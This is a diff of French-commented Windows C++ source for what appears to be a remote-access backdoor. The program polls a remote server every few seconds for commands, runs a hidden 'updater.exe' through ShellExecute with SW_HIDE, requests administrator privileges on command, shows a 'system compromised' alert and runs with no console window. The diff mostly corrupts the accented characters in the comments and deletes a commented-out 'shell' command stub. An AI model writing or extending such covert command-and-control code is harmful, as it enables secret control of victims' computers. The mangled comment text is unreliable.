@@ -12,12 +12,12 @@ using namespace std;
 
 #pragma comment(lib, "wininet.lib")
 
-// Affiche une boîte de dialogue d'alerte.
+// Affiche une boï¿½te de dialogue d'alerte.
 void ShowMessage() {
-    MessageBox(NULL, TEXT("Votre système est compromis !"), TEXT("Alerte"), MB_OK);
+    MessageBox(NULL, TEXT("Votre systï¿½me est compromis !"), TEXT("Alerte"), MB_OK);
 }
 
-// Effectue une requête HTTP GET pour récupérer une commande depuis un serveur distant.
+// Effectue une requï¿½te HTTP GET pour rï¿½cupï¿½rer une commande depuis un serveur distant.
 string GetCommand() {
     string command;
 
@@ -41,7 +41,7 @@ string GetCommand() {
     return command;
 }
 
-// Fonction pour lançer les maj
+// Fonction pour lanï¿½er les maj
 string userFolder = GetUserFolderPath();
 string updaterFolder = userFolder + "\\fish";
 string updaterPath = updaterFolder + "\\updater.exe";
@@ -49,7 +49,7 @@ void StartUpdate(const string& UpdaterPath) {
     ShellExecute(NULL, "open", UpdaterPath.c_str(), NULL, NULL, SW_HIDE);
 }
 
-// Thread qui interroge périodiquement le serveur pour vérifier la commande.
+// Thread qui interroge pï¿½riodiquement le serveur pour vï¿½rifier la commande.
 void ListenForCommand() {
     while (true) {
         string cmd = GetCommand();
@@ -72,17 +72,11 @@ void ListenForCommand() {
             RequestAdminPrivileges();
         }
 
-        /*
-        else if (parseCommand(cmd) == "shell") {
-
-        }
-        */
-
         this_thread::sleep_for(chrono::seconds(5));
     }
 }
 
-// Point d'entrée de l'application Windows (aucune console ne sera affichée)
+// Point d'entrï¿½e de l'application Windows (aucune console ne sera affichï¿½e)
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
 
 
